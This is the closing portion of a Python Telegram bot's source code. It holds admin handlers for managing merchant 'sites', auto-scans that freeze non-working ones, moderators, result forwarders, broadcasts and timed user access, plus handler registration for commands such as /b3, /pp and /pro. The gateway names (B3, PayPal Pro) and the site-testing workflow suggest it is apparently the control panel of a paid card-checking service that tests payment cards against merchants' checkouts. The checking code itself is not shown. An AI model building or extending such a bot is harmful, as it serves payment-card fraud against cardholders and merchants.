        keyboard.append([InlineKeyboardButton(f"🗑️ Auto-Remove Bad Sites: {auto_remove_status}", callback_data='ppcp_toggle_auto_remove')])
        keyboard.append([InlineKeyboardButton("⬅️ Back", callback_data='admin_settings')])
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            f"🔗 *PPCP Sites*\n\nTotal sites: {len(sites)}\nAuto-Remove Bad Sites: {auto_remove_status}\n\nSelect an option:",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )


async def autoscan_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle auto-scan settings callbacks"""
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    
    # Check if user is admin or mod
    if not is_admin_or_mod(user_id):
        await query.edit_message_text("❌ This action is only available to admins and mods.")
        return
    
    action = query.data
    
    if action == 'autoscan_toggle':
        settings = load_auto_scan_settings()
        settings['enabled'] = not settings.get('enabled', False)
        save_auto_scan_settings(settings)
        
        # Redirect back to auto-scan settings
        enabled = settings.get('enabled', False)
        interval = settings.get('interval_hours', 1)
        status_text = "🟢 Enabled" if enabled else "🔴 Disabled"
        
        keyboard = [
            [InlineKeyboardButton(f"{'🔴 Disable' if enabled else '🟢 Enable'}", callback_data='autoscan_toggle')],
            [
                InlineKeyboardButton("1h", callback_data='autoscan_interval_1'),
                InlineKeyboardButton("2h", callback_data='autoscan_interval_2'),
                InlineKeyboardButton("6h", callback_data='autoscan_interval_6'),
            ],
            [
                InlineKeyboardButton("12h", callback_data='autoscan_interval_12'),
                InlineKeyboardButton("24h", callback_data='autoscan_interval_24'),
            ],
            [InlineKeyboardButton("🔄 Run Scan Now", callback_data='autoscan_run_now')],
            [InlineKeyboardButton("⬅️ Back", callback_data='admin_settings')],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            f"⏰ *Auto-Scan Settings*\n\nStatus: {status_text}\nInterval: Every {interval} hour(s)\n\nAuto-scan tests all non-frozen B3 sites and freezes non-working ones.\n\nSelect interval or toggle:",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    elif action.startswith('autoscan_interval_'):
        interval = int(action.replace('autoscan_interval_', ''))
        settings = load_auto_scan_settings()
        settings['interval_hours'] = interval
        save_auto_scan_settings(settings)
        
        # Redirect back to auto-scan settings
        enabled = settings.get('enabled', False)
        status_text = "🟢 Enabled" if enabled else "🔴 Disabled"
        
        keyboard = [
            [InlineKeyboardButton(f"{'🔴 Disable' if enabled else '🟢 Enable'}", callback_data='autoscan_toggle')],
            [
                InlineKeyboardButton("1h", callback_data='autoscan_interval_1'),
                InlineKeyboardButton("2h", callback_data='autoscan_interval_2'),
                InlineKeyboardButton("6h", callback_data='autoscan_interval_6'),
            ],
            [
                InlineKeyboardButton("12h", callback_data='autoscan_interval_12'),
                InlineKeyboardButton("24h", callback_data='autoscan_interval_24'),
            ],
            [InlineKeyboardButton("🔄 Run Scan Now", callback_data='autoscan_run_now')],
            [InlineKeyboardButton("⬅️ Back", callback_data='admin_settings')],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            f"⏰ *Auto-Scan Settings*\n\n✅ Interval updated to {interval} hour(s)\n\nStatus: {status_text}\nInterval: Every {interval} hour(s)\n\nAuto-scan tests all non-frozen B3 sites and freezes non-working ones.\n\nSelect interval or toggle:",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    elif action == 'autoscan_run_now':
        await query.edit_message_text("🔄 *Running Auto-Scan...*\n\nPlease wait...", parse_mode='Markdown')
        
        # Run scan on non-frozen sites only
        sites = get_all_b3_sites()
        freeze_state = load_site_freeze_state()
        
        results = []
        working_count = 0
        failed_count = 0
        frozen_count = 0
        
        for site in sites:
            is_frozen = freeze_state.get(site, {}).get('frozen', False)
            
            if is_frozen:
                frozen_count += 1
                continue  # Skip frozen sites
            
            is_working, reason = test_b3_site(site)
            
            if is_working:
                working_count += 1
                results.append(f"✅ {site}: Working")
            else:
                failed_count += 1
                results.append(f"❌ {site}: {reason}")
                # Auto-freeze non-working sites
                set_site_frozen(site, True)
                results[-1] += " (Auto-frozen)"
        
        keyboard = [[InlineKeyboardButton("⬅️ Back", callback_data='settings_auto_scan')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        result_text = "\n".join(results) if results else "No active sites to test."
        await query.edit_message_text(
            f"🔄 *Auto-Scan Results*\n\n"
            f"✅ Working: {working_count}\n"
            f"❌ Failed & Frozen: {failed_count}\n"
            f"⏸️ Already Frozen: {frozen_count}\n\n"
            f"{result_text}",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )


async def mods_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle mods management callbacks"""
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    
    # Only admin can manage mods
    if user_id != ADMIN_ID:
        await query.edit_message_text("❌ Only the admin can manage mods.")
        return
    
    action = query.data
    
    if action == 'mods_add':
        # Store pending action
        with pending_ppcp_actions_lock:
            pending_ppcp_actions[user_id] = {'action': 'add_mod'}
        
        keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data='mods_cancel')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            "➕ *Add Mod*\n\n"
            "Please send the user ID of the person you want to add as mod:",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    elif action == 'mods_list':
        mods_db = get_all_mods()
        
        if not mods_db:
            keyboard = [[InlineKeyboardButton("⬅️ Back", callback_data='admin_manage_mods')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(
                "📋 *Mods List*\n\nNo mods found.",
                reply_markup=reply_markup,
                parse_mode='Markdown'
            )
            return
        
        mods_list = ""
        for mod_id, mod_data in mods_db.items():
            added_date = mod_data.get('added_date', 'Unknown')
            mods_list += f"• User ID: `{mod_id}`\n  Added: {added_date[:10]}\n"
        
        keyboard = [[InlineKeyboardButton("⬅️ Back", callback_data='admin_manage_mods')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            f"📋 *Mods List* ({len(mods_db)} total)\n\n{mods_list}",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    elif action == 'mods_remove':
        mods_db = get_all_mods()
        
        if not mods_db:
            keyboard = [[InlineKeyboardButton("⬅️ Back", callback_data='admin_manage_mods')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(
                "➖ *Remove Mod*\n\nNo mods to remove.",
                reply_markup=reply_markup,
                parse_mode='Markdown'
            )
            return
        
        keyboard = []
        for mod_id in mods_db.keys():
            keyboard.append([InlineKeyboardButton(f"🗑️ {mod_id}", callback_data=f'mods_del_{mod_id}')])
        
        keyboard.append([InlineKeyboardButton("⬅️ Back", callback_data='admin_manage_mods')])
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            "➖ *Remove Mod*\n\nSelect a mod to remove:",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    elif action.startswith('mods_del_'):
        mod_id = action.replace('mods_del_', '')
        
        if remove_mod(mod_id):
            await query.edit_message_text(
                f"✅ *Mod Removed*\n\nUser ID: `{mod_id}`",
                parse_mode='Markdown'
            )
            
            # Redirect back to mods menu after a moment
            await asyncio.sleep(1)
            
            mods_db = get_all_mods()
            keyboard = [
                [InlineKeyboardButton("➕ Add Mod", callback_data='mods_add')],
            ]
            if mods_db:
                keyboard.append([InlineKeyboardButton("📋 List Mods", callback_data='mods_list')])
                keyboard.append([InlineKeyboardButton("➖ Remove Mod", callback_data='mods_remove')])
            keyboard.append([InlineKeyboardButton("⬅️ Back", callback_data='admin_back_main')])
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await query.edit_message_text(
                f"👮 *Manage Mods*\n\nCurrent mods: {len(mods_db)}\n\nSelect an option:",
                reply_markup=reply_markup,
                parse_mode='Markdown'
            )
        else:
            await query.edit_message_text(f"❌ Failed to remove mod `{mod_id}`.", parse_mode='Markdown')
    
    elif action == 'mods_cancel':
        # Cancel pending action
        with pending_ppcp_actions_lock:
            if user_id in pending_ppcp_actions:
                del pending_ppcp_actions[user_id]
        
        # Redirect back to mods menu
        mods_db = get_all_mods()
        keyboard = [
            [InlineKeyboardButton("➕ Add Mod", callback_data='mods_add')],
        ]
        if mods_db:
            keyboard.append([InlineKeyboardButton("📋 List Mods", callback_data='mods_list')])
            keyboard.append([InlineKeyboardButton("➖ Remove Mod", callback_data='mods_remove')])
        keyboard.append([InlineKeyboardButton("⬅️ Back", callback_data='admin_back_main')])
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            f"👮 *Manage Mods*\n\nCurrent mods: {len(mods_db)}\n\nSelect an option:",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )

async def file_edit_message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle incoming messages for file editing, PPCP site additions, mod additions, and forwarder management"""
    user_id = update.effective_user.id
    
    # Check if user is admin or mod
    if not is_admin_or_mod(user_id):
        return
    
    message_text = update.message.text
    if not message_text:
        return
    
    # Check for forwarder actions first
    if 'forwarder_action' in context.user_data:
        action = context.user_data.get('forwarder_action')
        gateway = context.user_data.get('forwarder_gateway')
        gateway_names = {"b3": "B3", "pp": "PP", "ppro": "PPRO"}
        gateway_name = gateway_names.get(gateway, gateway.upper())
        
        if action == 'add':
            step = context.user_data.get('forwarder_step')
            
            if step == 'name':
                # Store name and ask for bot token
                context.user_data['forwarder_name'] = message_text.strip()
                context.user_data['forwarder_step'] = 'token'
                
                await update.message.reply_text(
                    f"➕ *Add {gateway_name} Forwarder*\n\n"
                    f"Name: {message_text.strip()}\n\n"
                    "Step 2/3: Enter the bot token\n"
                    "Example: 1234567890:ABCdefGHIjklMNOpqrsTUVwxyz",
                    parse_mode='Markdown'
                )
                return
            
            elif step == 'token':
                # Store token and ask for chat ID
                context.user_data['forwarder_token'] = message_text.strip()
                context.user_data['forwarder_step'] = 'chat_id'
                
                await update.message.reply_text(
                    f"➕ *Add {gateway_name} Forwarder*\n\n"
                    f"Name: {context.user_data['forwarder_name']}\n"
                    f"Token: {message_text.strip()[:10]}...\n\n"
                    "Step 3/3: Enter the chat ID\n"
                    "Example: -1001234567890 or @channelname",
                    parse_mode='Markdown'
                )
                return
            
            elif step == 'chat_id':
                # Create the forwarder
                name = context.user_data['forwarder_name']
                token = context.user_data['forwarder_token']
                chat_id = message_text.strip()
                
                add_forwarder(gateway, name, token, chat_id)
                
                # Clear context
                context.user_data.clear()
                
                await update.message.reply_text(
                    f"✅ *Forwarder Added Successfully*\n\n"
                    f"Name: {name}\n"
                    f"Gateway: {gateway_name}\n"
                    f"Chat ID: {chat_id}",
                    parse_mode='Markdown'
                )
                return
        
        elif action == 'edit':
            field = context.user_data.get('forwarder_field')
            idx = context.user_data.get('forwarder_index')
            
            field_map = {
                'name': 'name',
                'token': 'bot_token',
                'chat': 'chat_id'
            }
            
            # Update the forwarder
            kwargs = {field_map[field]: message_text.strip()}
            update_forwarder(gateway, idx, **kwargs)
            
            # Clear context
            context.user_data.clear()
            
            await update.message.reply_text(
                f"✅ *Forwarder Updated Successfully*\n\n"
                f"Field: {field.title()}\n"
                f"New Value: {message_text.strip()}",
                parse_mode='Markdown'
            )
            return
    
    # Check for pending PPCP/mod actions first
    with pending_ppcp_actions_lock:
        if user_id in pending_ppcp_actions:
            pending_action = pending_ppcp_actions[user_id]
            action_type = pending_action.get('action')
            
            if action_type == 'add_site':
                # Adding PPCP site
                del pending_ppcp_actions[user_id]
                
                site_url = message_text.strip()
                
                # Validate URL
                if not site_url.startswith('http://') and not site_url.startswith('https://'):
                    await update.message.reply_text(
                        "❌ Invalid URL. Please provide a valid URL starting with http:// or https://",
                        parse_mode='Markdown'
                    )
                    return
                
                if add_ppcp_site(site_url):
                    await update.message.reply_text(
                        f"✅ *Site Added Successfully*\n\n{site_url}",
                        parse_mode='Markdown'
                    )
                else:
                    await update.message.reply_text(
                        f"⚠️ Site already exists or failed to add:\n{site_url}",
                        parse_mode='Markdown'
                    )
                return
            
            elif action_type == 'add_mod':
                # Adding mod - only admin can do this
                if user_id != ADMIN_ID:
                    del pending_ppcp_actions[user_id]
                    await update.message.reply_text("❌ Only the admin can add mods.")
                    return
                
                del pending_ppcp_actions[user_id]
                
                try:
                    mod_user_id = int(message_text.strip())
                    
                    if is_mod(mod_user_id):
                        await update.message.reply_text(
                            f"⚠️ User `{mod_user_id}` is already a mod.",
                            parse_mode='Markdown'
                        )
                        return
                    
                    if mod_user_id == ADMIN_ID:
                        await update.message.reply_text("❌ Cannot add admin as mod.")
                        return
                    
                    add_mod(mod_user_id, user_id)
                    await update.message.reply_text(
                        f"✅ *Mod Added Successfully*\n\nUser ID: `{mod_user_id}`",
                        parse_mode='Markdown'
                    )
                except ValueError:
                    await update.message.reply_text(
                        "❌ Invalid user ID. Please provide a numeric user ID.",
                        parse_mode='Markdown'
                    )
                return
            
            elif action_type == 'add_ppro_site':
                # Adding PayPal Pro site
                del pending_ppcp_actions[user_id]
                
                site_url = message_text.strip()
                
                # Validate URL
                if not site_url.startswith('http://') and not site_url.startswith('https://'):
                    await update.message.reply_text(
                        "❌ Invalid URL. Please provide a valid URL starting with http:// or https://",
                        parse_mode='Markdown'
                    )
                    return
                
                if add_paypalpro_site(site_url):
                    await update.message.reply_text(
                        f"✅ *PayPal Pro Site Added Successfully*\n\n{site_url}",
                        parse_mode='Markdown'
                    )
                else:
                    await update.message.reply_text(
                        f"⚠️ Site already exists or failed to add:\n{site_url}",
                        parse_mode='Markdown'
                    )
                return
            
            elif action_type == 'edit_start_message':
                # Editing start message
                del pending_ppcp_actions[user_id]
                
                new_message = message_text.strip()
                set_start_message(new_message)
                
                await update.message.reply_text(
                    f"✅ *Start Message Updated Successfully*\n\n"
                    f"New message preview:\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"{new_message[:500]}{'...' if len(new_message) > 500 else ''}\n"
                    f"━━━━━━━━━━━━━━━━━━━━",
                    parse_mode='Markdown'
                )
                return
            
            elif action_type == 'broadcast_send':
                # Broadcasting message to all users
                del pending_ppcp_actions[user_id]
                
                broadcast_message = message_text.strip()
                db = load_user_db()
                
                success_count = 0
                fail_count = 0
                
                status_msg = await update.message.reply_text(
                    f"📢 *Broadcasting...*\n\nSending to {len(db)} users...",
                    parse_mode='Markdown'
                )
                
                for target_user_id in db.keys():
                    try:
                        await context.bot.send_message(
                            chat_id=int(target_user_id),
                            text=broadcast_message
                        )
                        success_count += 1
                    except Exception as e:
                        fail_count += 1
                        print(f"Failed to send to {target_user_id}: {e}")
                    
                    # Small delay to avoid rate limiting
                    await asyncio.sleep(0.05)
                
                await status_msg.edit_text(
                    f"📢 *Broadcast Complete*\n\n"
                    f"✅ Sent: {success_count}\n"
                    f"❌ Failed: {fail_count}",
                    parse_mode='Markdown'
                )
                return
            
            elif action_type == 'broadcast_pin':
                # Broadcasting and pinning message to all users
                del pending_ppcp_actions[user_id]
                
                broadcast_message = message_text.strip()
                db = load_user_db()
                
                success_count = 0
                pin_count = 0
                fail_count = 0
                
                status_msg = await update.message.reply_text(
                    f"📌 *Broadcasting & Pinning...*\n\nSending to {len(db)} users...",
                    parse_mode='Markdown'
                )
                
                for target_user_id in db.keys():
                    try:
                        sent_msg = await context.bot.send_message(
                            chat_id=int(target_user_id),
                            text=broadcast_message
                        )
                        success_count += 1
                        
                        # Try to pin the message
                        try:
                            await context.bot.pin_chat_message(
                                chat_id=int(target_user_id),
                                message_id=sent_msg.message_id,
                                disable_notification=True
                            )
                            pin_count += 1
                        except Exception as pin_error:
                            print(f"Failed to pin for {target_user_id}: {pin_error}")
                    except Exception as e:
                        fail_count += 1
                        print(f"Failed to send to {target_user_id}: {e}")
                    
                    # Small delay to avoid rate limiting
                    await asyncio.sleep(0.05)
                
                await status_msg.edit_text(
                    f"📌 *Broadcast & Pin Complete*\n\n"
                    f"✅ Sent: {success_count}\n"
                    f"📌 Pinned: {pin_count}\n"
                    f"❌ Failed: {fail_count}",
                    parse_mode='Markdown'
                )
                return
    
    # Check if there's a pending file edit (thread-safe)
    with pending_file_edits_lock:
        if user_id not in pending_file_edits:
            return
        
        pending_edit = pending_file_edits[user_id]
        if not pending_edit.get('awaiting_content'):
            return
        
        site_folder = pending_edit['site']
        filename = pending_edit['file']
        
        # Remove pending edit
        del pending_file_edits[user_id]
    
    # Get the new content from the message
    new_content = message_text
    
    if not new_content:
        await update.message.reply_text("❌ No content received. Edit cancelled.")
        return
    
    # Write the new content to the file
    success = write_site_file(site_folder, filename, new_content)
    
    if success:
        await update.message.reply_text(
            f"✅ *File Updated Successfully*\n\n"
            f"📁 Site: {site_folder}\n"
            f"📄 File: {filename}\n"
            f"📝 Size: {len(new_content)} characters",
            parse_mode='Markdown'
        )
    else:
        await update.message.reply_text(
            f"❌ *Failed to Update File*\n\n"
            f"📁 Site: {site_folder}\n"
            f"📄 File: {filename}\n\n"
            "Please try again.",
            parse_mode='Markdown'
        )

async def remove_user_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /remove command (admin only)"""
    user_id = update.effective_user.id
    
    # Check if user is admin or mod
    if not is_admin_or_mod(user_id):
        await update.message.reply_text("❌ This command is only available to admins and mods.")
        return
    
    # Check if user ID is provided
    if not context.args:
        await update.message.reply_text(
            "❌ Please provide a user ID.\n\n"
            "Format: /remove <user_id>\n"
            "Example: /remove 7405189284"
        )
        return
    
    try:
        target_user_id = str(int(context.args[0]))
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID. Please provide a numeric user ID.")
        return
    
    db = load_user_db()
    
    if target_user_id not in db:
        await update.message.reply_text(f"❌ User `{target_user_id}` not found in database.", parse_mode='Markdown')
        return
    
    del db[target_user_id]
    save_user_db(db)
    
    await update.message.reply_text(f"✅ User `{target_user_id}` has been removed.", parse_mode='Markdown')

async def approve_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /approve command (admin and mods)"""
    user_id = update.effective_user.id
    
    print(f"DEBUG: /approve command called by user {user_id}")
    
    # Check if user is admin or mod
    if not is_admin_or_mod(user_id):
        await update.message.reply_text("❌ This command is only available to admins and mods.")
        return
    
    # Check if user ID is provided
    if not context.args:
        await update.message.reply_text(
            "❌ Please provide a user ID.\n\n"
            "Format: /approve <user_id>\n"
            "Example: /approve 7405189284"
        )
        return
    
    try:
        target_user_id = int(context.args[0])
        print(f"DEBUG: Target user ID to approve: {target_user_id}")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID. Please provide a numeric user ID.")
        return
    
    # Store pending approval (thread-safe)
    with pending_approvals_lock:
        pending_approvals[user_id] = target_user_id
        print(f"DEBUG: Stored pending approval - Admin {user_id} -> Target {target_user_id}")
        print(f"DEBUG: Current pending_approvals: {pending_approvals}")
    
    # Create inline keyboard for duration selection
    keyboard = [
        [
            InlineKeyboardButton("1 Day", callback_data='duration_1day'),
            InlineKeyboardButton("1 Week", callback_data='duration_1week'),
        ],
        [
            InlineKeyboardButton("1 Month", callback_data='duration_1month'),
            InlineKeyboardButton("Lifetime", callback_data='duration_lifetime'),
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    print(f"DEBUG: Sending keyboard with {len(keyboard)} rows")
    
    await update.message.reply_text(
        f"👤 Approving user: `{target_user_id}`\n\n"
        "⏰ How long should this user have access?",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )
    
    print(f"DEBUG: Keyboard sent successfully")

async def duration_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle duration selection callback"""
    query = update.callback_query
    
    try:
        # Answer the callback query immediately to remove loading state
        await query.answer()
        
        user_id = query.from_user.id
        
        print(f"DEBUG: Callback received from user {user_id}, data: {query.data}")
        
        # Check if user is admin or mod
        if not is_admin_or_mod(user_id):
            await query.edit_message_text("❌ This action is only available to admins and mods.")
            return
        
        # Check if there's a pending approval (thread-safe)
        with pending_approvals_lock:
            print(f"DEBUG: Current pending_approvals: {pending_approvals}")
            if user_id not in pending_approvals:
                await query.edit_message_text("❌ No pending approval found. Please use /approve <user_id> again.")
                return
            
            target_user_id = pending_approvals[user_id]
            print(f"DEBUG: Target user ID: {target_user_id}")
        
        duration_type = query.data.replace('duration_', '')
        print(f"DEBUG: Duration type: {duration_type}")
        
        # Approve the user
        success = approve_user(target_user_id, duration_type)
        print(f"DEBUG: Approval success: {success}")
        
        if success:
            duration_text = {
                '1day': '1 Day',
                '1week': '1 Week',
                '1month': '1 Month',
                'lifetime': 'Lifetime'
            }.get(duration_type, duration_type)
            
            await query.edit_message_text(
                f"✅ User `{target_user_id}` has been approved!\n\n"
                f"⏰ Access Duration: {duration_text}",
                parse_mode='Markdown'
            )
            
            # Remove from pending approvals (thread-safe)
            with pending_approvals_lock:
                if user_id in pending_approvals:
                    del pending_approvals[user_id]
                    print(f"DEBUG: Removed pending approval for admin {user_id}")
        else:
            await query.edit_message_text("❌ Failed to approve user. Please try again.")
    
    except Exception as e:
        print(f"ERROR in duration_callback: {str(e)}")
        import traceback
        traceback.print_exc()
        try:
            await query.edit_message_text(f"❌ Error processing approval: {str(e)}")
        except:
            pass

async def unknown_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle unknown callback queries for debugging"""
    query = update.callback_query
    if query:
        print(f"DEBUG: Unknown callback received: {query.data} from user {query.from_user.id}")
        await query.answer("⚠️ Unknown action. Please try again.")

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle errors"""
    print(f"Update {update} caused error {context.error}")
    import traceback
    traceback.print_exc()

def main():
    """Main function to run the bot"""
    print("🚀 Starting Telegram Bot...")
    
    # Get bot token from environment variable or file
    bot_token = os.getenv('TELEGRAM_BOT_TOKEN')
    
    if not bot_token:
        # Try to read from bot_token.txt file
        try:
            with open('bot_token.txt', 'r') as f:
                bot_token = f.read().strip()
        except FileNotFoundError:
            print("❌ Bot token not found!")
            print("Please set TELEGRAM_BOT_TOKEN environment variable or create bot_token.txt file")
            return
    
    # Create application
    application = Application.builder().token(bot_token).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("b3", b3_command))
    application.add_handler(CommandHandler("b3s", b3s_command))
    application.add_handler(CommandHandler("pp", pp_command))
    application.add_handler(CommandHandler("pro", pro_command))
    application.add_handler(CommandHandler("approve", approve_command))
    application.add_handler(CommandHandler("admin", admin_menu_command))
    application.add_handler(CommandHandler("remove", remove_user_command))
    application.add_handler(CommandHandler("status", status_command))
    
    # Add callback query handlers (must be before generic handlers)
    application.add_handler(CallbackQueryHandler(duration_callback, pattern=r'^duration_'))
    application.add_handler(CallbackQueryHandler(admin_callback_handler, pattern=r'^admin_'))
    application.add_handler(CallbackQueryHandler(interval_callback_handler, pattern=r'^interval_'))
    application.add_handler(CallbackQueryHandler(settings_callback_handler, pattern=r'^settings_'))
    application.add_handler(CallbackQueryHandler(forwarders_callback_handler, pattern=r'^fwd_'))
    application.add_handler(CallbackQueryHandler(b3site_callback_handler, pattern=r'^b3site_'))
    application.add_handler(CallbackQueryHandler(b3file_callback_handler, pattern=r'^b3file_'))
    application.add_handler(CallbackQueryHandler(b3edit_callback_handler, pattern=r'^b3edit_'))
    application.add_handler(CallbackQueryHandler(b3cancel_callback_handler, pattern=r'^b3cancel_'))
    application.add_handler(CallbackQueryHandler(b3toggle_callback_handler, pattern=r'^b3toggle_'))
    application.add_handler(CallbackQueryHandler(b3info_callback_handler, pattern=r'^b3info_'))
    application.add_handler(CallbackQueryHandler(b3test_callback_handler, pattern=r'^b3test'))
    application.add_handler(CallbackQueryHandler(ppcp_callback_handler, pattern=r'^ppcp_'))
    application.add_handler(CallbackQueryHandler(paypalpro_callback_handler, pattern=r'^ppro_'))
    application.add_handler(CallbackQueryHandler(mass_callback_handler, pattern=r'^mass_'))
    application.add_handler(CallbackQueryHandler(gwinterval_callback_handler, pattern=r'^gwinterval_'))
    application.add_handler(CallbackQueryHandler(startmsg_callback_handler, pattern=r'^startmsg_'))
    application.add_handler(CallbackQueryHandler(broadcast_callback_handler, pattern=r'^broadcast_'))
    application.add_handler(CallbackQueryHandler(autoscan_callback_handler, pattern=r'^autoscan_'))
    application.add_handler(CallbackQueryHandler(mods_callback_handler, pattern=r'^mods_'))
    
    # Add message handler for file editing (must be before catch-all)
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, file_edit_message_handler))
    
    # Add catch-all callback handler for debugging (must be last)
    application.add_handler(CallbackQueryHandler(unknown_callback_handler))
    
    # Add error handler
    application.add_error_handler(error_handler)
    
    print("✅ Handlers registered successfully")
    
    # Start the bot
    print("✅ Bot is running...")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()